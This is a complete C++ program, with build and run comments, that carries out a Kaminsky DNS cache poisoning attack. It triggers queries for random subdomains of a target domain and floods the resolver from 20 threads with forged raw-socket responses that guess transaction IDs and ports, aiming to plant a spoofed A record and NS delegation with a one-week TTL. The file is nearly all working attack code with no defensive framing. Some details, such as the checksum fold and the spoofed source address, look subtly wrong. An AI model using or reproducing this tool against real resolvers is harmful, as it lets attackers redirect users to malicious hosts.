// Compile: g++ -o kaminsky kaminsky.cpp -lpthread
// Run: sudo ./kaminsky <target_dns> <target_domain> <spoof_ip> <authoritative_ns>
// Requires: root privileges (raw sockets)

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <thread>
#include <vector>
#include <atomic>
#include <random>

class KaminskyAttack {
private:
    std::string targetDNS, targetDomain, spoofIP, authNS;
    std::atomic<uint16_t> txidCounter{0};
    std::atomic<uint16_t> portCounter{1024};
    std::atomic<bool> success{false};
    
    unsigned short checksum(void* data, int len) {
        unsigned short* buf = (unsigned short*)data;
        unsigned int sum = 0;
        while (len > 1) { sum += *buf++; len -= 2; }
        if (len == 1) sum += *(unsigned char*)buf;
        sum = (sum >> 16) + (sum + 0xFFFF);
        sum += (sum >> 16);
        return ~sum;
    }
    
    int encodeName(char* buf, const std::string& name) {
        int pos = 0;
        size_t start = 0, dot;
        while ((dot = name.find('.', start)) != std::string::npos) {
            int len = dot - start;
            buf[pos++] = len;
            memcpy(buf + pos, name.c_str() + start, len);
            pos += len;
            start = dot + 1;
        }
        int len = name.length() - start;
        buf[pos++] = len;
        memcpy(buf + pos, name.c_str() + start, len);
        pos += len;
        buf[pos++] = 0;
        return pos;
    }
    
public:
    KaminskyAttack(const std::string& dns, const std::string& domain,
                   const std::string& spoof, const std::string& ns)
        : targetDNS(dns), targetDomain(domain), spoofIP(spoof), authNS(ns) {}
    
    void sendForgedResponse(uint16_t txid, uint16_t srcPort, const std::string& subdomain) {
        int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if (sock < 0) return;
        
        int one = 1;
        setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
        
        char packet[512];
        memset(packet, 0, sizeof(packet));
        
        struct iphdr* ip = (struct iphdr*)packet;
        struct udphdr* udp = (struct udphdr*)(packet + sizeof(struct iphdr));
        char* dns = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
        
        // DNS Header - Response with Answer + Authority + Additional
        *(uint16_t*)(dns + 0) = htons(txid);
        *(uint16_t*)(dns + 2) = htons(0x8400);  // QR=1, AA=1
        *(uint16_t*)(dns + 4) = htons(1);  // QDCOUNT
        *(uint16_t*)(dns + 6) = htons(1);  // ANCOUNT
        *(uint16_t*)(dns + 8) = htons(1);  // NSCOUNT
        *(uint16_t*)(dns + 10) = htons(1); // ARCOUNT
        
        // Question: <random>.targetDomain
        int pos = 12;
        std::string question = subdomain + "." + targetDomain;
        pos += encodeName(dns + pos, question);
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;  // Type A
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;  // Class IN
        
        // Answer: spoofed A record with long TTL
        *(uint16_t*)(dns + pos) = htons(0xC00C); pos += 2;  // Name pointer
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;       // Type A
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;       // Class IN
        *(uint32_t*)(dns + pos) = htonl(604800); pos += 4;  // TTL 1 week
        *(uint16_t*)(dns + pos) = htons(4); pos += 2;
        struct in_addr spoofAddr;
        inet_aton(spoofIP.c_str(), &spoofAddr);
        memcpy(dns + pos, &spoofAddr.s_addr, 4); pos += 4;
        
        // Authority: NS record for target domain
        pos += encodeName(dns + pos, targetDomain);
        *(uint16_t*)(dns + pos) = htons(2); pos += 2;       // Type NS
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;       // Class IN
        *(uint32_t*)(dns + pos) = htonl(604800); pos += 4;  // TTL
        int nsLenPos = pos;
        pos += 2;  // Placeholder for RDLENGTH
        int nsStart = pos;
        pos += encodeName(dns + pos, authNS);
        *(uint16_t*)(dns + nsStart - 2) = htons(pos - nsStart);
        
        // Additional: A record for nameserver (glue)
        pos += encodeName(dns + pos, authNS);
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        *(uint32_t*)(dns + pos) = htonl(604800); pos += 4;
        *(uint16_t*)(dns + pos) = htons(4); pos += 2;
        memcpy(dns + pos, &spoofAddr.s_addr, 4); pos += 4;
        
        // UDP Header
        udp->source = htons(53);  // Spoofed source = real DNS port
        udp->dest = htons(srcPort);
        udp->len = htons(sizeof(struct udphdr) + pos);
        udp->check = 0;
        
        // IP Header
        ip->ihl = 5;
        ip->version = 4;
        ip->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + pos;
        ip->ttl = 64;
        ip->protocol = IPPROTO_UDP;
        ip->saddr = inet_addr(targetDNS.c_str());  // Spoofed source = DNS server
        ip->daddr = inet_addr(targetDNS.c_str());  // Target
        ip->check = checksum(ip, sizeof(struct iphdr));
        
        struct sockaddr_in dest;
        dest.sin_family = AF_INET;
        dest.sin_port = htons(srcPort);
        dest.sin_addr.s_addr = inet_addr(targetDNS.c_str());
        
        sendto(sock, packet, ip->tot_len, 0, (struct sockaddr*)&dest, sizeof(dest));
        close(sock);
    }
    
    void triggerQuery(const std::string& subdomain) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) return;
        
        char query[256];
        memset(query, 0, sizeof(query));
        
        *(uint16_t*)(query + 0) = htons(rand());
        *(uint16_t*)(query + 2) = htons(0x0100);
        *(uint16_t*)(query + 4) = htons(1);
        
        std::string question = subdomain + "." + targetDomain;
        int pos = 12;
        pos += encodeName(query + pos, question);
        *(uint16_t*)(query + pos) = htons(1); pos += 2;
        *(uint16_t*)(query + pos) = htons(1); pos += 2;
        
        struct sockaddr_in dest;
        dest.sin_family = AF_INET;
        dest.sin_port = htons(53);
        dest.sin_addr.s_addr = inet_addr(targetDNS.c_str());
        
        sendto(sock, query, pos, 0, (struct sockaddr*)&dest, sizeof(dest));
        close(sock);
    }
    
    void run() {
        std::random_device rd;
        std::mt19937 gen(rd());
        
        std::cout << "[*] Kaminsky attack starting...\n";
        
        while (!success.load()) {
            // Random subdomain forces new lookup each time
            std::uniform_int_distribution<> subDis(1, 999999);
            std::string subdomain = std::to_string(subDis(gen));
            
            // Trigger query to DNS server
            triggerQuery(subdomain);
            
            // Flood forged responses with different TXIDs and source ports
            std::vector<std::thread> threads;
            for (int t = 0; t < 20; t++) {
                threads.emplace_back([this, subdomain, &gen]() {
                    for (int i = 0; i < 500; i++) {
                        uint16_t txid = rand() & 0xFFFF;
                        uint16_t port = 1024 + (rand() % 64000);
                        sendForgedResponse(txid, port, subdomain);
                    }
                });
            }
            for (auto& t : threads) t.join();
            
            std::cout << "[*] Attempted subdomain: " << subdomain << "\n";
        }
    }
};

int main(int argc, char* argv[]) {
    if (argc != 5) {
        std::cerr << "Usage: " << argv[0] 
                  << " <target_dns> <target_domain> <spoof_ip> <auth_ns>\n";
        return 1;
    }
    srand(time(NULL));
    KaminskyAttack attack(argv[1], argv[2], argv[3], argv[4]);
    attack.run();
    return 0;
}
